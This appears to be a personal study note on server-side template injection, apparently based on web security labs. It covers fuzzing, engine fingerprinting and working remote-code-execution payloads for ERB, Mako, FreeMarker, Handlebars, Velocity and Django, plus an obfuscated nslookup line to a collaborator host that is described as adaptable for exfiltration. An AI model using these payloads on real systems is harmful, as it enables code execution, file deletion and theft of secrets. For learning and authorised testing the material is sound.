#SSTI #Completed

![[SSTI.webp]]
# Server-Side Template Injection

Template engines are designed to generate web pages by combining fixed templates with volatile data. SSTI occurs when user input is concatenated directly in a template, allowing attackers to inject arbitrary template directives to manipulate the engine.

Static templates that provide placeholders are generally not vulnerable. For example, an email that greets each user by their name:

```php
`$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`
```

Since templates are simply strings, user input can be concatenated into templates prior to rendering. For example, users are able to customize parts of the email:

```php
`$output = $twig->render("Dear " . $_GET['name']);`
```

Part of the template may be dynamically generated using the GET parameter of `name`. If not sanitized, attackers can place a SSTI payload inside the name parameter:

```json
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
# Recon

First step to find it is fuzzing the template by injecting a sequence of special characters such as:

```bash
${{<%[%'"}}%\
```

If exceptions are raised, it indicates potential interpretation by the server. SSTI can occur in two contexts, but always try the following context-specific approaches.

Most template languages allow free input of content by using HTML tags or via the template engine's native syntax. By setting mathematical operations as the value of the parameter, it can test for entry points. For example:

```bash
http://vulnerable-website.com/?username=${7*7}
```

If it returns `Hello 49` or `49` anywhere, it is evaluated. 

In code context, the vulnerability may be exposed by user input placed within an expression such as:

```php
greeting = getQueryParameter('greeting') 
engine.render("Hello {{"+greeting+"}}", data)
```

It may result in:

```bash
http://vulnerable-website.com/?greeting=data.username
```

A  method for testing SSTI here is establishing the parameter does not contain a direct XSS vulnerability via:

```bash
http://vulnerable-website.com/?greeting=data.username<tag>
```

If no XSS, try breaking out of the statement using templating syntax:

```bash
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

If still no results, it may be the wrong syntax or SSTI is not possible. If rendered properly, it indicates SSTI such as `Hello Carlos<tag>`.

To identify the templating engine, try submitting invalid syntax first to result in an error. For example, `<%=foobar%>` may trigger an error in Ruby ERB:

```ruby
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

If not, test language-specific payloads by injecting mathematical operations using different syntax such as:

- `${7*7}`
- `{{7*7}}`
- `A{*comment*}b`
- `${"z".join("ab")}`
- `{{7*'7'}}`

![[SSTI Path.png]]
# Cheat Sheet

Some useful cheat sheets include:

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#filter-bypasses)
- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

An obfuscation example that can help to bypass filtering is the following:

```bash
<%system("nslookup $(e`echo ch`o hello).yvxfjnpedf14.oastify.com")%>
```

This will append the string "hello" to Burp Collaborator. This can be changed to exfiltrate data.
# Basic Template Injection

Reading documentation is a good starting point. For example, once you know that Mako is being used, achieving remote code execution could be as simple as:

```python
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

In unsandboxed environments, achieving RCE is similarly as simple in many templating engines.

For example, if you try and view a product that is out of stock, a message may reflect stating it's out of stock via a GET request. If a template engine is in use, reading the docs may reveal the syntax below evaluates an expression and renders the result on page:

```ruby
<%= someExpression %>
```

Alternatively, fuzzing using the template injection payloads in Intruder may reveal a payload that gets evaluated such as:

```ruby
<%= 7*7 %>
```

If evaluated, check the page for `49`. If SSTI is confirmed, try additional payloads to achieve RCE such as the following:

```ruby
<%= system("whoami") %>
<%= system("ls") %>
```
# Basic SSTI in Code Context

In terms of code context, check all functionality of the application. Try posting comments on a blog for example. There may be an option to select what username the site uses for you such as first name or nick name. Check the request for an indication of a template such as `user.name`:

```ruby
blog-post-author-display=user.nickname&csrf=jE8TKKWWKg34LwuofXdJDI9EZotYTrEA
```

If fuzzing does not work such as in the comments, try triggering an error by changing the attribute to something else such as `user.random` and analyse the response. It may reveal the templating engine:

```ruby
blog-post-author-display=user.name}}{{7*7}}&csrf=jE8TKKWWKg34LwuofXdJDI9EZotYTrEA
blog-post-author-display=user.random&csrf=jE8TKKWWKg34LwuofXdJDI9EZotYTrEA
```

If so, try closing the object by prepending `}}` and adding a payload such as:

```ruby
blog-post-author-display=}}{% import os %}{{os.system('whoami')}}&csrf=jE8TKKWWKg34LwuofXdJDI9EZotYTrEA
```

If an empty expression error shows, try injecting something known such as `user.name` before the payload:

```ruby
blog-post-author-display=user.name}}{% import os %}{{os.system('whoami')}}&csrf=jE8TKKWWKg34LwuofXdJDI9EZotYTrEA
```
# SSTI Using Documentation

Template engine documentation may provide a security section with vulnerable examples. If not, if a particular built-in object or function poses a risk, there is likely a warning which may not provide much detail, but can be useful for testing.

In ERB, the documentation reveals you can list all directories and read arbitrary files via:

```ruby
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

If you compromise an account that can edit product descriptions or templates, try editing a template and look for certain syntax such as:

```ruby
${someExpression}
```

If so, attempt to change an existing one to refer to an object that does not exist to produce an error:

```ruby
${foobar}
```

For example, FreeMarker documentation states that the `new()` built-in can be dangerous as you can create Java objects that implement the `TemplateModel` interface. The `TemplateModel` has an `Execute` class that can use shell commands.

Attempt to construct an exploit such as:

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
```

>[!info]
>Additionally, try off-the-shelf payloads through things like [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

Also try and attempt to trigger an overly verbose error message on the app, which discloses the template engine in use:

```ruby
${7*test}
```
# SSTI via Documented Exploit

Once you identify the template engine, try searching for any vulnerabilities that others may have already discovered. It is sometimes possible to find well-documented exploits you might be able to tweak.

For example, if fuzzing returns an error that exposes the templating engine such as Handlebars, attempt to search for any existing exploits for it via a query like "Handlebars SSTI RCE exploit". In terms of Handlebars, a famous exploit by [@Zombiehelp54](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html) is:

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

It could be modified to gain remote code execution:

```javascript
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('ls');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

For how it works, see below:

1. The `{{#with "s" as |string|}}` binds the string `s` to the variable `string`. The string can be referenced as an object with properties and methods such as `"s".constructor`.
2. The `{{#with "e"}}` section is an inner block that provides another context level. It could be any string and has no direct impact, a placeholder to maintain consistent nesting.
3. The `{{#with split as |conslist|}}` assigns the value `split` to the variable `conslist`. The split is ambiguous, but references a method or function related to splitting strings (not sure though). `conslist` is an array used to manipulate method calls and data later.
4. The `{{this.pop}}` part removes the last element from the `conslist`, preparing it to insert something else, specifically the constructor of the string's method.
5. The `{{this.push (lookup string.sub "constructor")}}` part is as follows:
	1. The `lookup` helper is used to look up properties of an object, looking up the constructor property of the `string.sub` function.
	2. `string.sub` refers to a method like `substring`. Every function in JS has a constructor, which is the Function constructor.
	3. It pushes the `Function` constructor into the `conslist`.
6. The `{{this.pop}}` removes the last element again.
7. The `{{#with string.split as |codelist|}}` assigns the value `string.split` to the variable `codelist`. `string.split` is a method that splits a string into an array of substrings.
	1. Uses the array to store the malicious code to execute. `codelist` eventually holds the JS code as strings, which are combined and executed via the `Function` constructor.
8. The `{{this.pop}}` removes the last element again.
9. The `{{this.push "return require('child_process').exec('ls');"}}` is where the malicious payload is injected. It pushes the string into the `codelist` array. When executed, it runs the require method, which allows system commands. 
10. The `{{this.pop}}` removes the last element again.
11. The `{{#each conslist}}` iterates over the `conslist` array. For each element, it attempts to execute the code stored in `codelist`.
12. The `{{#with (string.sub.apply 0 codelist)}}` calls the apply method on `string.sub`, with arguments `0` and `codelist`. The `string.sub.apply` part applies the function `string.sub` to the array. The `codelist` contains JS code, and through apply, it executes by using the `Function` constructor injected earlier.
13. The `{{this}}` part refers to the result of the previous with block, which is the result of the executed code.

Additionally, for Handlebars templating engine, you can try and identify it via the following payload:

```javascript
{{this}}{{self}}
```
# Developer-Supplied Objects

Many template engines expose a self or environment object acting like a namespace containing all objects, methods and attributes supported. If it exists, use it to generate a list of objects in scope. In Java templating languages, list all variables via:

```java
${T(java.lang.System).getenv()}
```

Sites will contain built-in objects and custom objects. Pay attention to the custom ones as they contain sensitive information or exploitable methods. 

If RCE is not available, try leveraging SSTI for other exploits, such as file path traversal to search for sensitive data.

For example, if after fuzzing or editing a template you find an app running Django, it has a built-in template tag - `debug` - that can display debugging information:

```django
{% debug %}
```

Analyse the list of objects and properties for anything interesting. An interesting one may be the `settings` object as it contains a `SECRET_KEY` property. To extract it:

```django
{{settings.SECRET_KEY}}
```
# Custom Exploits Using an Object Chain

The first step is to identify objects and methods you have access to. Some objects can appear interesting immediately. When studying documentation for objects, pay attention to which methods the objects grant access to and the objects they return. 

Try to discovery combinations of objects and methods to chain together. Chaining together the right objects and methods can gain access to dangerous functionality and sensitive data. 

In Java-based Velocity, there is a `ClassTool` object called `$class`. You can chain the `$class.inspect()` method and `$class.type` property to obtain references to arbitrary objects. It could be exploited to execute shell commands on the target:

```java
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
```
# Custom Exploits Using Developer-Supplied Objects

Some templating engines run in a secure environment. Developer created objects that are exposed to the template can offer a better attack surface. Site-specific objects are not documented and working out how to exploit them requires investigation of the site's behaviour manually to identify the attack surface.

